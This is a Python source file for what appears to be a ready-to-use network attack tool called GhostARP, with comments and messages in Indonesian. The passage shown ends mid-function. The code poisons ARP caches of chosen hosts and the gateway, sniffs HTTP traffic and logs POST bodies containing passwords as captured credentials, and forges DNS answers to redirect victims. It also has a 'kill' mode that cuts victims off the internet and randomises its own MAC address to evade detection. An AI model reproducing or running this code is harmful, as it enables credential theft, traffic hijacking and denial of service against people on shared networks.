#!/usr/bin/env python3
"""
GhostARP v1.5 - ARP Spoofing / MITM / DoS wrapper
Fitur :
  - Multi-target (interaktif, -t a,b,c, atau file) + ADD/DEL target saat runtime
  - Dashboard menampilkan HOST AKTIF (hasil ARP sweep) + status tiap host
  - Perintah SCAN untuk re-sweep jaringan saat runtime
  - Mode MITM  : internet korban tetap jalan, traffic di-sniff
  - Mode KILL  : internet korban PUTUS total (ARP poison tanpa forwarding)
  - DNS spoofing (mode MITM), HTTP sniffing + deteksi credential
  - Pause/resume poisoning, ganti mode runtime, manajemen DNS map runtime
  - Restore ARP semua target otomatis saat berhenti / target dihapus
Requirements : scapy, rich
Usage        : sudo python3 ghostarp.py
               sudo python3 ghostarp.py -t 192.168.1.2,192.168.1.3 --mode kill
               sudo python3 ghostarp.py --targets-file victims.txt --mode mitm --dns-file dns.txt
"""
import argparse
import atexit
import ipaddress
import os
import random
import select
import signal
import socket
import struct
import subprocess
import sys
import threading
import time
from dataclasses import dataclass, field
from typing import Dict, List, Optional, Tuple

# Platform check
WINDOWS = os.name == 'nt'

try:
    if WINDOWS:
        import msvcrt
        termios = None
        tty = None
        fcntl = None
    else:
        import termios
        import tty
        import fcntl
        msvcrt = None
except ImportError:
    WINDOWS = True
    import msvcrt
    termios = None
    tty = None
    fcntl = None

try:
    from scapy.all import (ARP, DNS, DNSQR, DNSRR, Ether, IP, Raw, TCP, UDP,
                           conf, sendp, sniff, srp, get_if_addr, get_if_hwaddr)
    from rich.box import SIMPLE_HEAVY
    from rich.console import Console, Group
    from rich.live import Live
    from rich.panel import Panel
    from rich.prompt import Confirm, IntPrompt, Prompt
    from rich.table import Table
    from rich.text import Text
except ImportError as e:
    sys.exit(f"[!] Dependency kurang: {e}\n    Install: sudo apt install python3-scapy python3-rich")

conf.verb = 0
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

console = Console()
POISON_INTERVAL = 2.0   # detik antar poison
RESTORE_COUNT = 5       # jumlah ARP restore saat exit
RESTORE_COUNT_FAST = 3  # jumlah ARP restore saat del target (runtime)
HOSTS_DISPLAY_MAX = 20  # maks host yang dirender di dashboard

BANNER = r"""
[bold cyan]
  ____ _           _    ____    _    ____  ____  
 / ___| |__   __ _| |_ / ___|  / \  |  _ \|  _ \ 
| |  _| '_ \ / _` | __| |  _   / _ \ | |_) | |_) |
| |_| | | | (_| | |_| |_| | / ___ \|  __/|  __/ 
 \____|_| |_|\__,_|\__|\____|/_/   \_\_|   |_|    
[/bold cyan]
[bold magenta]   ARP Spoofing / MITM / DoS Framework - Dashboard Config Edition[/bold magenta]
"""


# --------------------------------------------------------------------------
# System helpers
# --------------------------------------------------------------------------
def get_mac(iface: str) -> str:
    try:
        mac = get_if_hwaddr(iface)
        if mac:
            return mac.lower()
    except Exception:
        pass
    try:
        with open(f"/sys/class/net/{iface}/address") as f:
            return f.read().strip().lower()
    except Exception:
        return "00:00:00:00:00:00"


def _ioctl_ifreq(iface: str, req: int) -> str:
    if WINDOWS or fcntl is None:
        return "0.0.0.0"
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        data = fcntl.ioctl(s.fileno(), req, struct.pack("256s", iface.encode()[:15]))
        return socket.inet_ntoa(data[20:24])
    except Exception:
        return "0.0.0.0"
    finally:
        s.close()


def get_ip(iface: str) -> str:
    try:
        ip = get_if_addr(iface)
        if ip and ip != "0.0.0.0":
            return ip
    except Exception:
        pass
    try:
        return _ioctl_ifreq(iface, 0x8915)          # SIOCGIFADDR
    except Exception:
        return "127.0.0.1"


def get_netmask(iface: str) -> str:
    try:
        from scapy.all import conf
        for dev in conf.ifaces.values():
            if dev.name == iface or dev.pcap_name == iface:
                return dev.netmask
    except Exception:
        pass
    try:
        return _ioctl_ifreq(iface, 0x891B)          # SIOCGIFNETMASK
    except Exception:
        return "255.255.255.0"


def get_network(iface: str) -> ipaddress.IPv4Network:
    return ipaddress.IPv4Network(f"{get_ip(iface)}/{get_netmask(iface)}", strict=False)


def get_default_gateway() -> Optional[str]:
    try:
        from scapy.all import conf
        gw = conf.route.route("0.0.0.0")[2]
        if gw and gw != "0.0.0.0":
            return gw
    except Exception:
        pass
    try:
        with open("/proc/net/route") as f:
            for line in f.readlines()[1:]:
                p = line.split()
                if p[1] == "00000000":              # default route
                    return socket.inet_ntoa(struct.pack("<L", int(p[2], 16)))
    except Exception:
        pass
    return None


def list_up_interfaces() -> List[str]:
    out = []
    try:
        from scapy.all import conf
        for dev in conf.ifaces.values():
            if hasattr(dev, 'ip') and dev.ip and dev.ip != "127.0.0.1" and dev.ip != "0.0.0.0":
                out.append(dev.name)
    except Exception:
        pass
    if not out:
        try:
            for iface in sorted(os.listdir("/sys/class/net")):
                if iface == "lo":
                    continue
                try:
                    with open(f"/sys/class/net/{iface}/operstate") as f:
                        if f.read().strip() == "up":
                            out.append(iface)
                except OSError:
                    continue
        except Exception:
            pass
    if not out:
        out = ["eth0", "wlan0"]
    return sorted(list(set(out)))


def get_ip_forward() -> str:
    try:
        with open("/proc/sys/net/ipv4/ip_forward") as f:
            return f.read().strip()
    except Exception:
        return "0"


def set_ip_forward(enabled: bool) -> None:
    try:
        with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
            f.write("1" if enabled else "0")
    except Exception:
        pass


def random_mac() -> str:
    prefix = random.choice(["02:00:00", "06:00:00", "0a:00:00", "0e:00:00",
                            "12:00:00", "16:00:00", "1a:00:00", "1e:00:00"])
    return f"{prefix}:{':'.join(f'{random.randint(0,255):02x}' for _ in range(3))}"


def change_mac(iface: str, mac: str) -> None:
    if WINDOWS:
        return
    subprocess.run(["ip", "link", "set", iface, "down"], check=True)
    subprocess.run(["ip", "link", "set", iface, "address", mac], check=True)
    subprocess.run(["ip", "link", "set", iface, "up"], check=True)


def resolve_mac(ip: str, iface: str, timeout: float = 3.0) -> Optional[str]:
    try:
        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
                     timeout=timeout, iface=iface, verbose=0)
        return ans[0][1][Ether].src if ans else None
    except Exception:
        return None


def arp_sweep(iface: str, net: ipaddress.IPv4Network, timeout: float = 2.5) -> List[Tuple[str, str]]:
    try:
        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=str(net)),
                     timeout=timeout, iface=iface, verbose=0)
        return sorted(((rcv.psrc, rcv[Ether].src) for _, rcv in ans),
                      key=lambda h: ipaddress.ip_address(h[0]))
    except Exception:
        return []


def valid_ip(s: str) -> Optional[str]:
    try:
        return str(ipaddress.IPv4Address(s.strip()))
    except (ipaddress.AddressValueError, ValueError):
        return None


def load_spoof_map(path: Optional[str] = None, pairs_str: Optional[str] = None) -> Dict[str, str]:
    m: Dict[str, str] = {}
    if path:
        try:
            with open(path) as f:
                for line in f:
                    line = line.strip()
                    if not line or line.startswith("#"):
                        continue
                    if "=" in line:
                        d, ip = line.split("=", 1)
                    else:
                        parts = line.split()
                        if len(parts) < 2:
                            continue
                        d, ip = parts[0], parts[1]
                    m[d.lower().rstrip(".")] = ip.strip()
        except Exception:
            pass
    if pairs_str:
        for pair in pairs_str.split(","):
            pair = pair.strip()
            if "=" in pair:
                d, ip = pair.split("=", 1)
                m[d.strip().lower().rstrip(".")] = ip.strip()
    return m


# --------------------------------------------------------------------------
# Terminal raw-mode helpers
# --------------------------------------------------------------------------
_termios_old: Optional[List] = None


def _enter_cbreak() -> None:
    if WINDOWS or termios is None or tty is None:
        return
    global _termios_old
    fd = sys.stdin.fileno()
    _termios_old = termios.tcgetattr(fd)
    tty.setcbreak(fd)


def _restore_termios() -> None:
    if WINDOWS or termios is None:
        return
    global _termios_old
    if _termios_old is not None:
        try:
            termios.tcsetattr(sys.stdin.fileno(), termios.TCSADRAIN, _termios_old)
        except Exception:
            pass
        _termios_old = None


atexit.register(_restore_termios)


# --------------------------------------------------------------------------
# Shared state & data model
# --------------------------------------------------------------------------
@dataclass
class Victim:
    ip: str
    mac: str
    packets: int = 0            # paket ARP yang dikirim untuk korban ini


def parse_targets_cli(target_str: Optional[str], target_file: Optional[str], iface: str) -> List[Victim]:
    ips = []
    if target_str:
        for t in target_str.split(","):
            t = t.strip()
            if valid_ip(t):
                ips.append(valid_ip(t))
    if target_file:
        try:
            with open(target_file) as f:
                for line in f:
                    line = line.strip()
                    if not line or line.startswith("#"):
                        continue
                    parts = line.split()
                    if parts:
                        t = parts[0]
                        if valid_ip(t):
                            ips.append(valid_ip(t))
        except Exception as e:
            console.print(f"[red][!] Gagal membaca file target: {e}[/]")
    
    victims = []
    for ip in sorted(list(set(ips))):
        console.print(f"[*] Resolving MAC untuk target CLI: {ip}...")
        mac = resolve_mac(ip, iface)
        if mac:
            victims.append(Victim(ip=ip, mac=mac))
            console.print(f"[green][+] Target terdaftar: {ip} ({mac})[/]")
        else:
            console.print(f"[red][!] Gagal resolve MAC untuk {ip}. Dilewati.[/]")
    return victims


@dataclass
class State:
    start_time: float = field(default_factory=time.time)
    http: List[Tuple[str, str, str, str]] = field(default_factory=list)   # (ts, src, method, url)
    dns: List[Tuple[str, str, str]] = field(default_factory=list)         # (ts, src, qname)
    creds: int = 0
    log: List[Tuple[str, str, str]] = field(default_factory=list)         # (ts, msg, style)
    _lock: threading.Lock = field(default_factory=threading.Lock)
    
    # Configuration State (Dashboard Setup Mode)
    status: str = "SETUP"  # "SETUP" | "ATTACKING"
    iface: str = ""
    own_ip: str = ""
    own_mac: str = ""
    net: ipaddress.IPv4Network = field(default_factory=lambda: ipaddress.IPv4Network("127.0.0.0/8"))
    gateway_ip: str = ""
    gateway_mac: str = ""
    mode: str = "mitm"
    dead_mac: bool = False
    mac_spoof: bool = False
    dns_file: str = ""
    dns_spoof_map: Dict[str, str] = field(default_factory=dict)
    
    # Active targets (while in SETUP or ATTACKING)
    victims: List[Victim] = field(default_factory=list)
    
    # Scanned hosts from background ARP sweeps
    scanned_hosts: List[Tuple[str, str]] = field(default_factory=list)
    scanning: bool = False
    resolving_gateway: bool = False

    def add_log(self, msg: str, style: str = "white") -> None:
        with self._lock:
            self.log.append((time.strftime("%H:%M:%S"), msg, style))
            del self.log[:-40]

    def snapshot(self):
        with self._lock:
            return (self.http.copy(), self.dns.copy(), self.log.copy(), self.creds)


@dataclass
class InputState:
    buf: str = ""


# --------------------------------------------------------------------------
# Background Async Tasks
# --------------------------------------------------------------------------
def background_scan(state: State) -> None:
    if state.scanning:
        return
    def run_scan():
        state.scanning = True
        state.add_log(f"Scan: ARP sweep pada {state.net}...", "yellow")
        try:
            found = arp_sweep(state.iface, state.net)
            # Filter own IP
            found = [h for h in found if h[0] != state.own_ip]
            with state._lock:
                state.scanned_hosts = found
            state.add_log(f"Scan selesai: {len(found)} host aktif ditemukan.", "green")
        except Exception as e:
            state.add_log(f"Scan gagal: {e}", "red")
        finally:
            state.scanning = False

    threading.Thread(target=run_scan, daemon=True).start()


def background_resolve_gateway(state: State) -> None:
    if state.resolving_gateway:
        return
    def run_resolve():
        state.resolving_gateway = True
        state.add_log(f"Resolving gateway MAC untuk {state.gateway_ip}...", "yellow")
        try:
            mac = resolve_mac(state.gateway_ip, state.iface)
            if mac:
                with state._lock:
                    state.gateway_mac = mac
                state.add_log(f"Gateway resolved: {state.gateway_ip} -> {mac}", "green")
            else:
                state.add_log(f"Gateway {state.gateway_ip} tidak respons ARP.", "red")
        except Exception as e:
            state.add_log(f"Error resolving gateway: {e}", "red")
        finally:
            state.resolving_gateway = False

    threading.Thread(target=run_resolve, daemon=True).start()


# --------------------------------------------------------------------------
# Attack engine
# --------------------------------------------------------------------------
class ArpSpoof:
    def __init__(self, iface: str, own_ip: str, our_mac: str,
                 victims: List[Victim], gateway_ip: str, gateway_mac: str,
                 spoof_map: Dict[str, str], state: State, stop: threading.Event,
                 net: ipaddress.IPv4Network, mode: str = "mitm",
                 dead_mac: bool = False, sniff_ports: Optional[List[int]] = None):
        self.iface, self.own_ip, self.our_mac = iface, own_ip, our_mac
        self.gateway_ip, self.gateway_mac = gateway_ip, gateway_mac
        self.state, self.stop = state, stop
        self.net = net
        self.mode = mode                        # "mitm" | "kill"  (bisa diganti runtime)
        self.dead_mac = dead_mac                # disimpan terpisah supaya lie_mac dinamis
        self.paused = False
        self.sniff_ports = sniff_ports or [80, 8080]
        self._vlock = threading.Lock()          # proteksi victims (add/del runtime)
        self._dlock = threading.Lock()          # proteksi spoof_map
        self.victims: List[Victim] = list(victims)
        self.spoof_map: Dict[str, str] = dict(spoof_map)
        bpf = "udp port 53" + "".join(f" or tcp port {p}" for p in self.sniff_ports)
        self._bpf = bpf

    @property
    def lie_mac(self) -> bool:
        return self.dead_mac and self.mode == "kill"

    @property
    def total_packets(self) -> int:
        return sum(v.packets for v in self.victims_snapshot())

    def victims_snapshot(self) -> List[Victim]:
        with self._vlock:
            return list(self.victims)

    def spoof_snapshot(self) -> Dict[str, str]:
        with self._dlock:
            return dict(self.spoof_map)

    # -- ARP poisoning ----------------------------------------------------
    def _poison_mac(self) -> str:
        return "00:00:00:00:00:00" if self.lie_mac else self.our_mac

    def send_poison(self) -> None:
        lie = self._poison_mac()
        for v in self.victims_snapshot():
            try:
                # Victim <- "gateway ada di MAC <lie>"
                p1 = Ether(src=self.our_mac, dst=v.mac) / ARP(
                    op=2, psrc=self.gateway_ip, pdst=v.ip,
                    hwsrc=lie, hwdst=v.mac)
                # Gateway <- "victim ada di MAC <lie>"
                p2 = Ether(src=self.our_mac, dst=self.gateway_mac) / ARP(
                    op=2, psrc=v.ip, pdst=self.gateway_ip,
                    hwsrc=lie, hwdst=self.gateway_mac)
                sendp([p1, p2], iface=self.iface, verbose=0)
                v.packets += 2
            except Exception:
                pass

    def _poison_loop(self) -> None:
        while not self.stop.is_set():
            if not self.paused:
                try:
                    self.send_poison()
                except Exception as e:
                    self.state.add_log(f"Poison error: {e}", "red")
            self.stop.wait(POISON_INTERVAL)

    # -- Dynamic target management ----------------------------------------
    def add_victim(self, ip: str, state: State) -> None:
        ip = valid_ip(ip)
        if not ip:
            state.add_log(f"IP tidak valid: {ip}", "red")
            return
        with self._vlock:
            if any(v.ip == ip for v in self.victims):
                state.add_log(f"{ip} sudah jadi target", "yellow")
                return
        if ip == self.own_ip:
            state.add_log("Tidak bisa menarget IP sendiri", "red")
            return
        if ip == self.gateway_ip:
            state.add_log("Tidak bisa menarget gateway", "red")
            return

        def do_add():
            state.add_log(f"Resolving MAC untuk target {ip}...", "yellow")
            mac = resolve_mac(ip, self.iface)
            if not mac:
                state.add_log(f"Gagal resolve MAC {ip}", "red")
                return
            with self._vlock:
                if any(v.ip == ip for v in self.victims):
                    return
                new_v = Victim(ip=ip, mac=mac)
                self.victims.append(new_v)
                with state._lock:
                    state.victims = list(self.victims)
            self.send_poison()   # langsung racuni (termasuk target baru)
            state.add_log(f"[+] Target ditambahkan: {ip} ({mac})", "green")

        threading.Thread(target=do_add, daemon=True).start()

    def del_victim(self, ip: str, state: State) -> None:
        with self._vlock:
            v = next((x for x in self.victims if x.ip == ip), None)
            if not v:
                state.add_log(f"{ip} bukan target", "yellow")
                return
            self.victims.remove(v)
            with state._lock:
                state.victims = list(self.victims)
        
        def do_restore():
            self.restore_target(v, count=RESTORE_COUNT_FAST)
        threading.Thread(target=do_restore, daemon=True).start()
        state.add_log(f"[-] Target dihapus: {ip} - ARP di-restore", "yellow")

    def set_mode(self, mode: str, state: State) -> None:
        mode = mode.lower()
        if mode not in ("mitm", "kill"):
            state.add_log("mode harus: mitm | kill", "red")
            return
        self.mode = mode
        set_ip_forward(mode == "mitm")
        self.send_poison()   # refresh cache korban segera
        state.add_log(f"Mode -> {mode.upper()} (forward {'AKTIF' if mode == 'mitm' else 'NONAKTIF'})",
                      "green")

    def set_paused(self, paused: bool, state: State) -> None:
        self.paused = paused
        state.add_log("Poisoning di-pause (target tetap terdaftar)" if paused
                      else "Poisoning dilanjutkan", "cyan")

    def dns_add(self, dom: str, ip: str, state: State) -> None:
        dom = dom.strip().lower().rstrip(".")
        if not dom or not valid_ip(ip):
            state.add_log("Format: dns add domain=ip (IP harus valid)", "red")
            return
        with self._dlock:
            self.spoof_map[dom] = ip
        state.add_log(f"DNS spoof +: {dom} -> {ip}", "yellow")

    def dns_del(self, dom: str, state: State) -> None:
        dom = dom.strip().lower().rstrip(".")
        with self._dlock:
            if dom in self.spoof_map:
                del self.spoof_map[dom]
                state.add_log(f"DNS spoof -: {dom}", "yellow")
            else:
                state.add_log(f"Domain '{dom}' tidak ada di spoof map", "yellow")

    # -- Sniffing + DNS spoof --------------------------------------------
    def _maybe_spoof_dns(self, pkt, qname: str) -> None:
        if self.mode != "mitm":
            return
        if pkt[DNSQR].qtype not in (1, 255):
            return
        for domain, target in self.spoof_snapshot().items():
            if qname == domain or qname.endswith("." + domain):
                try:
                    resp = (Ether(src=self.our_mac, dst=pkt[Ether].src) /
                            IP(src=pkt[IP].dst, dst=pkt[IP].src) /
                            UDP(sport=pkt[UDP].dport, dport=pkt[UDP].sport) /
                            DNS(id=pkt[DNS].id, qr=1, aa=1,
                                qd=DNSQR(qname=qname, qtype=pkt[DNSQR].qtype),
                                an=DNSRR(rrname=qname, type="A", rclass="IN",
                                         ttl=60, rdata=target)))
                    sendp(resp, iface=self.iface, verbose=0)
                    self.state.add_log(f"DNS spoof: {qname} -> {target} (korban {pkt[IP].src})",
                                       "yellow")
                except Exception:
                    pass
                return

    def _packet_cb(self, pkt) -> None:
        if self.stop.is_set() or not pkt.haslayer(IP):
            return
        try:
            ts = time.strftime("%H:%M:%S")

            # HTTP requests (port 80/8080 dst)
            if (pkt.haslayer(TCP) and pkt.haslayer(Raw)
                    and pkt[TCP].dport in self.sniff_ports):
                payload = bytes(pkt[Raw].load).decode("utf-8", errors="ignore")
                lines = payload.split("\r\n")
                if lines and lines[0].split(" ")[0] in ("GET", "POST", "PUT", "HEAD",
                                                        "OPTIONS", "DELETE", "PATCH", "CONNECT"):
                    method, path = lines[0].split(" ")[0], lines[0].split(" ")[1]
                    host = next((h.split(":", 1)[1].strip() for h in lines
                                 if h.lower().startswith("host:")), "")
                    url = f"http://{host}{path}" if host else path
                    src = pkt[IP].src
                    with self.state._lock:
                        self.state.http.append((ts, src, method, url))
                        del self.state.http[:-40]
                    if method == "POST" and "\r\n\r\n" in payload:
                        body = payload.split("\r\n\r\n", 1)[1]
                        if any(k in body.lower() for k in ("password", "passwd", "login", "user")):
                            with self.state._lock:
                                self.state.creds += 1
                            self.state.add_log(
                                f"[CREDENTIAL] POST {url} dari {src}: {body.strip()[:120]}", "red")

            # DNS queries + spoofing
            if pkt.haslayer(DNS) and pkt.haslayer(DNSQR) and pkt[DNS].qr == 0:
                qname = pkt[DNSQR].qname.decode(errors="ignore").rstrip(".")
                src = pkt[IP].src
                with self.state._lock:
                    self.state.dns.append((ts, src, qname))
                    del self.state.dns[:-40]
                if self.spoof_map:
                    self._maybe_spoof_dns(pkt, qname)
        except Exception:
            pass

    def _sniff_loop(self) -> None:
        try:
            sniff(iface=self.iface, prn=self._packet_cb, store=False,
                  filter=self._bpf, stop_filter=lambda p: self.stop.is_set())
        except Exception as e:
            self.state.add_log(f"Sniffer error: {e}", "red")

    def start(self) -> None:
        threading.Thread(target=self._poison_loop, daemon=True).start()
        threading.Thread(target=self._sniff_loop, daemon=True).start()
        mode_label = "KILL (internet terputus)" if self.mode == "kill" else "MITM (sniff)"
        self.state.add_log(
            f"Attack {mode_label} dimulai pada {len(self.victims)} target", "green")

    def restore_target(self, v: Victim, count: int = RESTORE_COUNT) -> None:
        for _ in range(count):
            try:
                sendp(Ether(src=self.gateway_mac, dst=v.mac) / ARP(
                    op=2, psrc=self.gateway_ip, pdst=v.ip,
                    hwsrc=self.gateway_mac, hwdst=v.mac),
                    iface=self.iface, verbose=0)
                sendp(Ether(src=v.mac, dst=self.gateway_mac) / ARP(
                    op=2, psrc=v.ip, pdst=self.gateway_ip,
                    hwsrc=v.mac, hwdst=self.gateway_mac),
                    iface=self.iface, verbose=0)
            except Exception:
                pass
            time.sleep(0.3)

    def restore(self) -> None:
        for v in self.victims_snapshot():
            self.restore_target(v, count=RESTORE_COUNT)
        self.state.add_log(f"ARP cache {len(self.victims)} target & gateway di-restore", "green")


# --------------------------------------------------------------------------
# Interactive command handler (dipanggil dari reader thread)
# --------------------------------------------------------------------------
def handle_cmd(state: State, cmd: str, attack_ref: List[Optional[ArpSpoof]], stop_event: threading.Event) -> None:
    cmd = cmd.strip()
    if not cmd:
        return
    parts = cmd.split()
    c = parts[0].lower()

    # Global exit commands
    if c in ("quit", "exit", "q", "x"):
        if state.status == "ATTACKING" and attack_ref[0]:
            attack_ref[0].stop.set()
            state.add_log("Menghentikan attack...", "yellow")
        stop_event.set()
        state.add_log("Perintah berhenti diterima - exit...", "yellow")
        return

    if state.status == "SETUP":
        if c == "help":
            state.add_log(
                "Setup commands: set iface <name> | set gw <ip> | set mode mitm|kill | macspoof on|off | "
                "dns add d=ip | dns del d | dns list | add <ip|num> | del <ip|num|all> | scan | start | quit",
                "cyan"
            )
        elif c == "set":
            if len(parts) < 3:
                state.add_log("Format: set <iface|gw|mode> <val>", "red")
                return
            sub = parts[1].lower()
            val = parts[2].lower()
            if sub in ("iface", "interface"):
                ifaces = list_up_interfaces()
                if val not in ifaces:
                    state.add_log(f"Interface tidak valid. Pilihan: {', '.join(ifaces)}", "red")
                    return
                state.iface = val
                state.own_ip = get_ip(val)
                state.own_mac = get_mac(val)
                state.net = get_network(val)
                state.gateway_ip = get_default_gateway() or "192.168.1.1"
                state.gateway_mac = ""
                background_resolve_gateway(state)
                background_scan(state)
                state.add_log(f"Interface diubah ke {val} (IP: {state.own_ip}, Net: {state.net})", "green")
            elif sub in ("gw", "gateway"):
                ip = valid_ip(val)
                if not ip:
                    state.add_log("IP Gateway tidak valid", "red")
                    return
                state.gateway_ip = ip
                state.gateway_mac = ""
                background_resolve_gateway(state)
                state.add_log(f"Gateway diubah ke {ip}", "green")
            elif sub == "mode":
                if val not in ("mitm", "kill"):
                    state.add_log("Mode harus 'mitm' atau 'kill'", "red")
                    return
                state.mode = val
                state.add_log(f"Mode diubah ke {val.upper()}", "green")
            else:
                state.add_log("set <iface|gw|mode> <val>", "red")

        elif c == "macspoof":
            if len(parts) < 2:
                state.add_log(f"MAC Spoof saat ini: {'ON' if state.mac_spoof else 'OFF'}", "cyan")
                return
            val = parts[1].lower()
            if val in ("on", "true", "1"):
                state.mac_spoof = True
                state.add_log("MAC Spoof diaktifkan (MAC dirandomize saat start)", "green")
            elif val in ("off", "false", "0"):
                state.mac_spoof = False
                state.add_log("MAC Spoof dinonaktifkan", "green")
            else:
                state.add_log("macspoof on|off", "red")

        elif c == "dns":
            if len(parts) < 2:
                state.add_log("dns add d=ip | dns del d | dns list", "cyan")
                return
            sub = parts[1].lower()
            if sub in ("add", "+"):
                for tok in ",".join(parts[2:]).split(","):
                    if "=" in tok:
                        d, ip = tok.split("=", 1)
                        d = d.strip().lower().rstrip(".")
                        ip = ip.strip()
                        if valid_ip(ip):
                            state.dns_spoof_map[d] = ip
                            state.add_log(f"DNS spoof +: {d} -> {ip}", "yellow")
                        else:
                            state.add_log(f"IP tidak valid: {ip}", "red")
            elif sub in ("del", "-"):
                for tok in parts[2:]:
                    d = tok.strip().lower().rstrip(".")
                    if d in state.dns_spoof_map:
                        del state.dns_spoof_map[d]
                        state.add_log(f"DNS spoof -: {d}", "yellow")
                    else:
                        state.add_log(f"Domain '{d}' tidak ada", "red")
            elif sub in ("list", "ls"):
                m = state.dns_spoof_map
                state.add_log("DNS spoof: " + (", ".join(f"{d}->{ip}" for d, ip in m.items()) or "kosong"), "cyan")
            else:
                state.add_log("dns add domain=ip | dns del domain | dns list", "cyan")

        elif c == "add":
            if len(parts) < 2:
                state.add_log("Format: add <ip_atau_indeks>", "red")
                return
            for tok in ",".join(parts[1:]).split(","):
                tok = tok.strip()
                if not tok:
                    continue
                target_ip = None
                if tok.isdigit():
                    idx = int(tok) - 1
                    with state._lock:
                        if 0 <= idx < len(state.scanned_hosts):
                            target_ip = state.scanned_hosts[idx][0]
                        else:
                            state.add_log(f"Indeks host {tok} tidak valid", "red")
                else:
                    target_ip = valid_ip(tok)
                
                if target_ip:
                    if target_ip == state.own_ip:
                        state.add_log("Tidak bisa menarget IP sendiri", "red")
                        continue
                    if target_ip == state.gateway_ip:
                        state.add_log("Tidak bisa menarget gateway", "red")
                        continue
                    if any(v.ip == target_ip for v in state.victims):
                        state.add_log(f"{target_ip} sudah ada di target", "yellow")
                        continue
                    
                    def resolve_and_add(ip):
                        state.add_log(f"Resolving MAC untuk target {ip}...", "yellow")
                        mac = resolve_mac(ip, state.iface)
                        if mac:
                            with state._lock:
                                state.victims.append(Victim(ip=ip, mac=mac))
                            state.add_log(f"[+] Target ditambahkan: {ip} ({mac})", "green")
                        else:
                            state.add_log(f"Gagal resolve MAC {ip} (no ARP response)", "red")
                    
                    threading.Thread(target=resolve_and_add, args=(target_ip,), daemon=True).start()

        elif c == "del":
            if len(parts) < 2:
                state.add_log("Format: del <ip_atau_indeks|all>", "red")
                return
            val = parts[1].lower()
            if val == "all":
                with state._lock:
                    state.victims.clear()
                state.add_log("Semua target dihapus", "yellow")
            else:
                for tok in ",".join(parts[1:]).split(","):
                    tok = tok.strip()
                    if not tok:
                        continue
                    target_ip = None
                    if tok.isdigit():
                        idx = int(tok) - 1
                        with state._lock:
                            if 0 <= idx < len(state.scanned_hosts):
                                target_ip = state.scanned_hosts[idx][0]
                            else:
                                state.add_log(f"Indeks {tok} tidak valid", "red")
                    else:
                        target_ip = valid_ip(tok)
                    
                    if target_ip:
                        with state._lock:
                            v = next((x for x in state.victims if x.ip == target_ip), None)
                            if v:
                                state.victims.remove(v)
                                state.add_log(f"[-] Target dihapus: {target_ip}", "yellow")
                            else:
                                state.add_log(f"{target_ip} bukan target", "red")

        elif c in ("scan", "sweep", "rescan"):
            background_scan(state)

        elif c in ("start", "run", "attack"):
            if not state.victims:
                state.add_log("Gagal: Belum ada target ditambahkan. Gunakan 'add <ip_or_num>'", "red")
                return
            if not state.gateway_ip:
                state.add_log("Gagal: Gateway IP belum ditentukan", "red")
                return
            if not state.gateway_mac:
                # Coba resolve sinkron sekali
                state.add_log("Resolving MAC gateway...", "yellow")
                mac = resolve_mac(state.gateway_ip, state.iface)
                if mac:
                    state.gateway_mac = mac
                    state.add_log(f"Gateway resolved: {state.gateway_ip} -> {mac}", "green")
                else:
                    state.add_log(f"Gagal: MAC gateway {state.gateway_ip} tidak respon ARP", "red")
                    return
            
            state.add_log("Mempersiapkan attack...", "yellow")
            
            # MAC Spoofing
            state.own_mac = get_mac(state.iface)
            if state.mac_spoof:
                new_mac = random_mac()
                state.add_log(f"Spoofing MAC: {state.own_mac} -> {new_mac}", "yellow")
                try:
                    change_mac(state.iface, new_mac)
                    state.own_mac = new_mac
                except Exception as e:
                    state.add_log(f"Gagal ubah MAC: {e}", "red")

            # Save forward state
            state._orig_fwd = get_ip_forward()
            set_ip_forward(state.mode == "mitm")
            
            attack_stop = threading.Event()
            sniff_ports = [80, 8080]
            attack = ArpSpoof(
                iface=state.iface,
                own_ip=state.own_ip,
                our_mac=state.own_mac,
                victims=state.victims,
                gateway_ip=state.gateway_ip,
                gateway_mac=state.gateway_mac,
                spoof_map=state.dns_spoof_map,
                state=state,
                stop=attack_stop,
                net=state.net,
                mode=state.mode,
                dead_mac=state.dead_mac,
                sniff_ports=sniff_ports
            )
            
            attack_ref[0] = attack
            attack.start()
            state.status = "ATTACKING"

        else:
            state.add_log(f"Perintah tidak dikenal: '{cmd}' (ketik 'help')", "red")

    elif state.status == "ATTACKING":
        attack = attack_ref[0]
        if not attack:
            state.status = "SETUP"
            return
        
        if c == "help":
            state.add_log(
                "Attack commands: stop | pause | resume | mode mitm|kill | add <ip|num> | del <ip|num|all> | scan | dns add d=ip | dns del d | quit",
                "cyan"
            )
        elif c == "stop":
            state.add_log("Menghentikan attack & memulihkan ARP...", "yellow")
            attack.stop.set()
            attack.restore()
            
            # Restore MAC
            if hasattr(state, '_orig_mac') and state._orig_mac and state.own_mac != state._orig_mac:
                try:
                    change_mac(state.iface, state._orig_mac)
                    state.own_mac = state._orig_mac
                    state.add_log(f"MAC dipulihkan ke {state._orig_mac}", "green")
                except Exception:
                    state.add_log("Gagal memulihkan MAC interface", "red")
            
            # Restore forward
            if hasattr(state, '_orig_fwd'):
                set_ip_forward(state._orig_fwd == "1")
            
            attack_ref[0] = None
            state.status = "SETUP"
            state.add_log("Attack dihentikan. Kembali ke Setup Mode.", "green")
            
        elif c == "add":
            if len(parts) < 2:
                state.add_log("Format: add <ip_atau_indeks>", "red")
                return
            for tok in ",".join(parts[1:]).split(","):
                tok = tok.strip()
                if not tok:
                    continue
                target_ip = None
                if tok.isdigit():
                    idx = int(tok) - 1
                    with state._lock:
                        if 0 <= idx < len(state.scanned_hosts):
                            target_ip = state.scanned_hosts[idx][0]
                        else:
                            state.add_log(f"Indeks host {tok} tidak valid", "red")
                else:
                    target_ip = valid_ip(tok)
                
                if target_ip:
                    attack.add_victim(target_ip, state)

        elif c == "del":
            if len(parts) < 2:
                state.add_log("Format: del <ip_atau_indeks|all>", "red")
                return
            val = parts[1].lower()
            if val == "all":
                for v in attack.victims_snapshot():
                    attack.del_victim(v.ip, state)
            else:
                for tok in ",".join(parts[1:]).split(","):
                    tok = tok.strip()
                    if not tok:
                        continue
                    target_ip = None
                    if tok.isdigit():
                        idx = int(tok) - 1
                        with state._lock:
                            if 0 <= idx < len(state.scanned_hosts):
                                target_ip = state.scanned_hosts[idx][0]
                            else:
                                state.add_log(f"Indeks {tok} tidak valid", "red")
                    else:
                        target_ip = valid_ip(tok)
